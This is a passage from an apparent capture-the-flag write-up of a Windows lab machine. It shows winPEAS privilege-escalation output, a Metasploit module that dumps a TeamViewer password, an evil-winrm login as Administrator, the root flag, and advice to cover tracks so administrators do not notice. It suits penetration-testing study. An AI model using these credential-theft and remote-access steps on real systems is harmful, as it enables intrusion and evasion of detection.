  VGAuthService(VMware, Inc. - VMware Alias Manager and Ticket Service)["C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"] - Auto - Running
  Alias Manager and Ticket Service
 =================================================================================================                                                     

  VMTools(VMware, Inc. - VMware Tools)["C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"] - Auto - Running
  Provides support for synchronizing objects between the host and guest operating systems.
 =================================================================================================                                                     

  VMware Physical Disk Helper Service(VMware, Inc. - VMware Physical Disk Helper Service)["C:\Program Files\VMware\VMware Tools\vmacthlp.exe"] - Auto - Running
  Enables support for running virtual machines from a physical disk partition
 =================================================================================================                                                     

  VMwareCAFCommAmqpListener(VMware CAF AMQP Communication Service)["C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\CommAmqpListener.exe"] - Manual - Stopped
  VMware Common Agent AMQP Communication Service
 =================================================================================================                                                     

  VMwareCAFManagementAgentHost(VMware CAF Management Agent Service)["C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\ManagementAgentHost.exe"] - Manual - Stopped
  VMware Common Agent Management Agent Service
 =================================================================================================                                                     

  VSS(Volume Shadow Copy)[C:\Windows\system32\vssvc.exe] - Manual - Stopped
  Manages and implements Volume Shadow Copies used for backup and other purposes. If this service is stopped, shadow copies will be unavailable for backup and the backup may fail. If this service is disabled, any services that explicitly depend on it will fail to start.                                    
 =================================================================================================                                                     

  wmiApSrv(WMI Performance Adapter)[C:\Windows\system32\wbem\WmiApSrv.exe] - Manual - Stopped
  Provides performance library information from Windows Management Instrumentation (WMI) providers to clients on the network. This service only runs when Performance Data Helper is activated.                                                                                                                   
 =================================================================================================                                                     


[+] Modifiable Services(T1007)
 [?] Check if you can modify any service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
  LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:
  UsoSvc: AllAccess, Start

[+] Looking if you can modify any service registry()
 [?] Check if you can modify the registry of a service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services-registry-permissions                                                                                                                                                       
  [-] Looks like you cannot change the registry of any service...

[+] Checking write permissions in PATH folders (DLL Hijacking)()
 [?] Check for DLL Hijacking in PATH folders https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dll-hijacking
  C:\Windows\system32
  C:\Windows
  C:\Windows\System32\Wbem
  C:\Windows\System32\WindowsPowerShell\v1.0\
  C:\Windows\System32\OpenSSH\


====================================(Applications Information)====================================

[+] Current Active Window Application(T1010&T1518)
System.NullReferenceException: Object reference not set to an instance of an object.
 at winPEAS.MyUtils.GetPermissionsFile(String path, Dictionary`2 SIDs)                                                                                 
 at winPEAS.Program.<PrintInfoApplications>g__PrintActiveWindow|44_0()                                                                                 

[+] Installed Applications --Via Program Files/Uninstall registry--(T1083&T1012&T1010&T1518)
 [?] Check if you can modify installed software https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#software
  C:\Program Files (x86)\TeamViewer\Version7
  C:\Program Files\Common Files
  C:\Program Files\desktop.ini
  C:\Program Files\internet explorer
  C:\Program Files\Microsoft SQL Server
  C:\Program Files\MSBuild
  C:\Program Files\Reference Assemblies
  C:\Program Files\Uninstall Information
  C:\Program Files\VMware
  C:\Program Files\Windows Defender
  C:\Program Files\Windows Defender Advanced Threat Protection
  C:\Program Files\Windows Mail
  C:\Program Files\Windows Media Player
  C:\Program Files\Windows Multimedia Platform
  C:\Program Files\windows nt
  C:\Program Files\Windows Photo Viewer
  C:\Program Files\Windows Portable Devices
  C:\Program Files\Windows Security
  C:\Program Files\Windows Sidebar
  C:\Program Files\WindowsApps
  C:\Program Files\WindowsPowerShell


[+] Autorun Applications(T1010)
 [?] Check if you can modify other users AutoRuns binaries https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#run-at-startup
System.IO.DirectoryNotFoundException: Could not find a part of the path 'c:\inetpub\wwwroot\Media\1034\%appdata%\Microsoft\Windows\Start Menu\Programs\Startup'.                                                                                                                                                    
 at System.IO.__Error.WinIOError(Int32 errorCode, String maybeFullPath)                                                                                
 at System.IO.FileSystemEnumerableIterator`1.CommonInit()                                                                                              
 at System.IO.FileSystemEnumerableIterator`1..ctor(String path, String originalUserPath, String searchPattern, SearchOption searchOption, SearchResultHandler`1 resultHandler, Boolean checkHost)                                                                                                                 
 at System.IO.Directory.GetFiles(String path, String searchPattern, SearchOption searchOption)                                                         
 at winPEAS.ApplicationInfo.GetAutoRunsFolder()                                                                                                        
 at winPEAS.ApplicationInfo.GetAutoRuns(Dictionary`2 NtAccountNames)                                                                                   
 at winPEAS.Program.<PrintInfoApplications>g__PrintAutoRuns|44_2()                                                                                     

[+] Scheduled Applications --Non Microsoft--(T1010)
 [?] Check if you can modify other users scheduled binaries https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#run-at-startup
System.IO.FileNotFoundException: Could not load file or assembly 'Microsoft.Win32.TaskScheduler, Version=2.8.16.0, Culture=neutral, PublicKeyToken=c416bc1b32d97233' or one of its dependencies. The system cannot find the file specified.                                                                         
File name: 'Microsoft.Win32.TaskScheduler, Version=2.8.16.0, Culture=neutral, PublicKeyToken=c416bc1b32d97233'                                           
 at winPEAS.ApplicationInfo.GetScheduledAppsNoMicrosoft()                                                                                              
 at winPEAS.Program.<PrintInfoApplications>g__PrintScheduled|44_3()                                                                                    
                                                                                                                                                       
WRN: Assembly binding logging is turned OFF.                                                                                                             
To enable assembly bind failure logging, set the registry value [HKLM\Software\Microsoft\Fusion!EnableLog] (DWORD) to 1.                                 
Note: There is some performance penalty associated with assembly bind failure logging.                                                                   
To turn this feature off, remove the registry value [HKLM\Software\Microsoft\Fusion!EnableLog].                                                          
                                                                                                                                                       


=========================================(Network Information)=========================================

[+] Network Shares(T1135)
  ADMIN$ (Path: C:\Windows)
  C$ (Path: C:\)
  IPC$ (Path: )

[+] Host File(T1016)
      127.0.0.1    Umbraco

[+] Network Ifaces and known hosts(T1016)
 [?] The masks are only for the IPv4 addresses 
  Ethernet0 2[00:50:56:B9:D6:06]: 10.10.10.180, fe80::51f1:f5e6:c1de:e8df%13, dead:beef::51f1:f5e6:c1de:e8df / 255.255.255.0
      Gateways: 10.10.10.2, fe80::250:56ff:feb9:2bc3%13
      DNSs: 8.8.8.8
      Known hosts:
        10.10.10.2            00-50-56-B9-2B-C3     Dynamic
        10.10.10.255          FF-FF-FF-FF-FF-FF     Static
        224.0.0.22            01-00-5E-00-00-16     Static
        224.0.0.251           01-00-5E-00-00-FB     Static
        224.0.0.252           01-00-5E-00-00-FC     Static

  Loopback Pseudo-Interface 1[]: 127.0.0.1, ::1 / 255.0.0.0
      Known hosts:
        224.0.0.22            00-00-00-00-00-00     Static


[+] Current Listening Ports(T1049&T1049)
 [?] Check for services restricted from the outside 
  Proto     Local Address          Foreing Address        State
  TCP       0.0.0.0:21                                    Listening
  TCP       0.0.0.0:80                                    Listening
  TCP       0.0.0.0:111                                   Listening
  TCP       0.0.0.0:135                                   Listening
  TCP       0.0.0.0:445                                   Listening
  TCP       0.0.0.0:5985                                  Listening
  TCP       0.0.0.0:47001                                 Listening
  TCP       0.0.0.0:49664                                 Listening
  TCP       0.0.0.0:49665                                 Listening
  TCP       0.0.0.0:49666                                 Listening
  TCP       0.0.0.0:49667                                 Listening
  TCP       0.0.0.0:49678                                 Listening
  TCP       0.0.0.0:49679                                 Listening
  TCP       0.0.0.0:49680                                 Listening
  TCP       10.10.10.180:139                              Listening
  TCP       10.10.10.180:2049                             Listening
  TCP       127.0.0.1:2049                                Listening
  TCP       127.0.0.1:5939                                Listening
  TCP       [::]:21                                       Listening
  TCP       [::]:80                                       Listening
  TCP       [::]:111                                      Listening
  TCP       [::]:135                                      Listening
  TCP       [::]:445                                      Listening
  TCP       [::]:5985                                     Listening
  TCP       [::]:47001                                    Listening
  TCP       [::]:49664                                    Listening
  TCP       [::]:49665                                    Listening
  TCP       [::]:49666                                    Listening
  TCP       [::]:49667                                    Listening
  TCP       [::]:49678                                    Listening
  TCP       [::]:49679                                    Listening
  TCP       [::]:49680                                    Listening
  TCP       [::1]:2049                                    Listening
  TCP       [dead:beef::51f1:f5e6:c1de:e8df]:2049                       Listening
  TCP       [fe80::51f1:f5e6:c1de:e8df%13]:2049                       Listening
  UDP       0.0.0.0:123                                   Listening
  UDP       0.0.0.0:500                                   Listening
  UDP       0.0.0.0:4500                                  Listening
  UDP       0.0.0.0:5353                                  Listening
  UDP       0.0.0.0:5355                                  Listening
  UDP       10.10.10.180:111                              Listening
  UDP       10.10.10.180:137                              Listening
  UDP       10.10.10.180:138                              Listening
  UDP       10.10.10.180:2049                             Listening
  UDP       127.0.0.1:111                                 Listening
  UDP       127.0.0.1:2049                                Listening
  UDP       127.0.0.1:50911                               Listening
  UDP       127.0.0.1:63285                               Listening
  UDP       [::]:123                                      Listening
  UDP       [::]:500                                      Listening
  UDP       [::1]:111                                     Listening
  UDP       [::1]:2049                                    Listening
  UDP       [dead:beef::51f1:f5e6:c1de:e8df]:111                       Listening
  UDP       [dead:beef::51f1:f5e6:c1de:e8df]:2049                       Listening
  UDP       [fe80::51f1:f5e6:c1de:e8df%13]:111                       Listening
  UDP       [fe80::51f1:f5e6:c1de:e8df%13]:2049                       Listening

[+] Firewall Rules(T1016)
 [?] Showing only DENY rules (too many ALLOW rules always) 
  Current Profiles: PUBLIC
  FirewallEnabled (Domain):    True
  FirewallEnabled (Private):    False
  FirewallEnabled (Public):    False
  DENY rules:

[+] DNS cached --limit 70--(T1016)
  Entry                                 Name                                  Data
  1.0.0.127.in-addr.arpa                1.0.0.127.in-addr.arpa.               Umbraco
  umbraco                               Umbraco                               127.0.0.1
  umbraco                                                                   


=========================================(Windows Credentials)=========================================

[+] Checking Windows Vault()
 [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault
  Not Found

[+] Checking Credential manager()
 [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault
  This function is not yet implemented.
  [i] If you want to list credentials inside Credential Manager use 'cmdkey /list'

[+] Saved RDP connections()
  Not Found

[+] Recently run commands()
  Not Found

[+] PS default transcripts history()
  [i] Read the PS histpry inside these files (if any)

[+] Checking for DPAPI Master Keys()
 [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi
  Not Found

[+] Checking for Credential Files()
 [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi
  Not Found

[+] Checking for RDCMan Settings Files()
 [?] Dump credentials from Remote Desktop Connection Manager https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#remote-desktop-credential-manager                                                                                                                                             
  Not Found

[+] Looking for kerberos tickets()
 [?]  https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88
[X] Exception: Object reference not set to an instance of an object.
  Not Found

[+] Looking saved Wifis()
  This function is not yet implemented.
  [i] If you want to list saved Wifis connections you can list the using 'netsh wlan show profile'
  [i] If you want to get the clear-text password use 'netsh wlan show profile <SSID> key=clear'

[+] Looking AppCmd.exe()
 [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#appcmd-exe
  AppCmd.exe was found in C:\Windows\system32\inetsrv\appcmd.exe You should try to search for credentials

[+] Looking SSClient.exe()
 [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#scclient-sccm
  Not Found

[+] Checking AlwaysInstallElevated(T1012)
 [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
  AlwaysInstallElevated isn't available

[+] Checking WSUS(T1012)
 [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#wsus
  Not Found


========================================(Browsers Information)========================================

[+] Looking for Firefox DBs(T1503)
 [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
  Not Found

[+] Looking for GET credentials in Firefox history(T1503)
 [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
  Not Found

[+] Looking for Chrome DBs(T1503)
 [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
  Not Found

[+] Looking for GET credentials in Chrome history(T1503)
 [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
  Not Found

[+] Chrome bookmarks(T1217)
  Not Found

[+] Current IE tabs(T1503)
 [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
[X] Exception: System.Reflection.TargetInvocationException: Exception has been thrown by the target of an invocation. ---> System.Runtime.InteropServices.COMException: The server process could not be started because the configured identity is incorrect. Check the username and password. (Exception from HRESULT: 0x8000401A)                                                                                                                                          
 --- End of inner exception stack trace ---                                                                                                            
 at System.RuntimeType.InvokeDispMethod(String name, BindingFlags invokeAttr, Object target, Object[] args, Boolean[] byrefModifiers, Int32 culture, String[] namedParameters)                                                                                                                                    
 at System.RuntimeType.InvokeMember(String name, BindingFlags bindingFlags, Binder binder, Object target, Object[] providedArgs, ParameterModifier[] modifiers, CultureInfo culture, String[] namedParams)                                                                                                        
 at winPEAS.KnownFileCredsInfo.GetCurrentIETabs()                                                                                                      
  Not Found

[+] Looking for GET credentials in IE history(T1503)
 [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history

[+] IE favorites(T1217)
  Not Found


==============================(Interesting files and registry)==============================

[+] Putty Sessions()
  Not Found

[+] Putty SSH Host keys()
  Not Found

[+] SSH keys in registry()
 [?] If you find anything here, follow the link to learn how to decrypt the SSH keys https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#ssh-keys-in-registry                                                                                                                                  
  Not Found

[+] Cloud Credentials(T1538&T1083&T1081)
 [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
  Not Found

[+] Unnattend Files()
  C:\Windows\Panther\Unattend.xml
<Password>*SENSITIVE*DATA*DELETED*</Password>     <Enabled>true</Enabled>      <Username>administrator</Username>     </AutoLogon>    <UserAccounts>     <LocalAccounts>      <LocalAccount wcm:action="add">       <Password>*SENSITIVE*DATA*DELETED*</Password>

[+] Powershell History()

[+] Looking for common SAM & SYSTEM backups()

[+] Looking for McAfee Sitelist.xml Files()

[+] Cached GPP Passwords()
[X] Exception: Could not find a part of the path 'C:\ProgramData\Microsoft\Group Policy\History'.

[+] Looking for possible regs with creds(T1012&T1214)
 [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#inside-the-registry
  Not Found
  Not Found
  Not Found
  Not Found

[+] Looking for possible password files in users homes(T1083&T1081)
 [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
  C:\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml

[+] Looking inside the Recycle Bin for creds files(T1083&T1081&T1145)
 [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
  Not Found

[+] Searching known files that can contain creds in home(T1083&T1081)
 [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files

[+] Looking for documents --limit 100--(T1083)
  Not Found

[+] Recent files --limit 70--(T1083&T1081)
[X] Exception: System.IO.DirectoryNotFoundException: Could not find a part of the path 'c:\Microsoft\Windows\Recent'.
 at System.IO.__Error.WinIOError(Int32 errorCode, String maybeFullPath)                                                                                
 at System.IO.FileSystemEnumerableIterator`1.CommonInit()                                                                                              
 at System.IO.FileSystemEnumerableIterator`1..ctor(String path, String originalUserPath, String searchPattern, SearchOption searchOption, SearchResultHandler`1 resultHandler, Boolean checkHost)                                                                                                                 
 at System.IO.Directory.GetFiles(String path, String searchPattern, SearchOption searchOption)                                                         
 at winPEAS.KnownFileCredsInfo.GetRecentFiles()                                                                                                        
  Not Found
```

</details>

- From those information the next target we would like to attack is TeamViewer, to do this i simply exit the shell we have now back to the meterpreter and type:

```
meterpreter > run post/windows/gather/credentials/teamviewer_passwords
[*] Finding TeamViewer Passwords on REMOTE
[+] Found Unattended Password: !R3m0te!
```

- Almost done, we will use another useful tool to help us finish the job. It is  [evil-winrm](https://github.com/Hackplayers/evil-winrm), it will help us to access this machine remotly with the passwork from teamviewer:

```
$ evil-winrm -i 10.10.10.180 -u Administrator -p '!R3m0te!'
Evil-WinRM shell v2.3
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

- Hell yeah, now is time to get the **Root Flag** babe!!!

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> more C:\Users\Administrator\Desktop\root.txt
faf4b6d3fde4df7deb6d5fc40cc9db3c
```

### Phase 5 – Covering Tracks

- Since we get connect to it with root, now it's time to clean up everything we did before. This phase is the most important phase, because if the sys-admin acidentaly see something strange, they will fix it up and cover the system's hole and maybe track you down. So be clean, be quiet and be safe.
